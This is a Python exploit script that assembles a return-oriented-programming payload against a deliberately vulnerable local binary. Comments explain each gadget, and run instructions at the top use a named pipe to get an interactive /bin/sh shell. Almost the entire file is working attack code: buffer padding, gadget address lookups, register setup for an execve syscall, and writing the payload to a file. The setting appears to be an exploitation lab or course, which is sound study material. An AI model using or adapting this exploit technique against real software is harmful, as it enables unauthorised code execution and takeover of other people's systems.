import pathlib
from exploitsCommon import *


# In order to run this exploit:
# - Run in a terminal:
#     - mkfifo ./bin/mypipe
#     - (cat ./bin/mypipe ; cat) | ./bin/vulnerable64bit.exe fread
# - Run in another terminal:
#     - python3 ./exploits/payloadExecveShell64.py && cat ./exploits/payloadExecveShell64.dat > ./bin/mypipe
# - Go back to the first terminal and wait a few seconds. You now have a shell. Test with "echo hi".


if __name__ == "__main__":
    Utils.changeCWDToScriptDirectory()

    print('Scanning bytes...')
    eb = ExploitBuilder(targetProcessName='vulnerable64bit.exe', archBitSize=64)

    # We want to make a ROP payload that calls `execve("/bin/sh", NULL, NULL)`. For this we need:
    # - RAX = the system call number for execve, namely 59;
    # - First argument (RDI) = address of "/bin/sh" (which we place on the stack);
    # - Second argument (RSI) = 0 (NULL);
    # - Third argument (RDX) = 0 (NULL);
    # - Make the system call with the `syscall` instruction.

    payloadComponents = [
        b'\xFF' * 100, # Add padding to get over the stack buffer.
        b'\xFF' * 12, # Add padding to get over ??.
        b'\xFF' * 8, # Add padding to get over the stored RBP value.

        # Set RDI to "/bin/sh"
            # RBX = address of 'pop rax; ret' sequence
            eb.getBytesOfInstrSeqAddress('pop rbx; ret'),
            eb.getBytesOfInstrSeqAddress('pop rax; ret'),

            # - push RSP;
            # - execute sequence at RBX;
            # => RAX = RSP.
            eb.getBytesOfInstrSeqAddress('push rsp; push rbx; setne al; ret'),

            # RCX = offset value
            eb.getBytesOfInstrSeqAddress('pop rcx; ret'),
            (88).to_bytes(8, 'little'),

            # RAX += offset, such that RAX -> "/bin/sh" (at the end of the payload)
            eb.getBytesOfInstrSeqAddress('add rax, rcx; ret'),

            # Exchange the values in RAX and RDI, such that RDI -> "/bin/sh"
            eb.getBytesOfInstrSeqAddress('xchg rdi, rax; cld; ret'),

        # Set RSI to 0
        eb.getBytesOfInstrSeqAddress('pop rsi; ret'),
        (0).to_bytes(8, 'little'),

        # Set RDX to 0:
        # - ECX = 0;
        # - RDX = ECX;
        eb.getBytesOfInstrSeqAddress('xor ecx, ecx; ret'),
        eb.getBytesOfInstrSeqAddress('movsxd rdx, ecx; ret'),

        # RAX = 59; (system call number for `execve();`)
        eb.getBytesOfInstrSeqAddress('pop rax; ret'),
        (59).to_bytes(8, 'little'),

        # call `execve("/bin/sh", NULL, NULL)`
        eb.getBytesOfInstrSeqAddress('syscall; ret'),

        # Place this string in the payload so that we can get a pointer to it.
        ExploitBuilder.convertStringToCStringBytes('/bin/sh'),
    ]

    # Concatenate payload
    payload = b''.join(payloadComponents)

    # Prepend the size of the payload to itself
    payloadSize = len(payload)
    payload = payloadSize.to_bytes(4, sys.byteorder) + payload

    print()
    print(f"len(payload) = {len(payload)}")
    print(f"payload = {payload.hex()}")

    scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
    with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
        fout.write(payload)
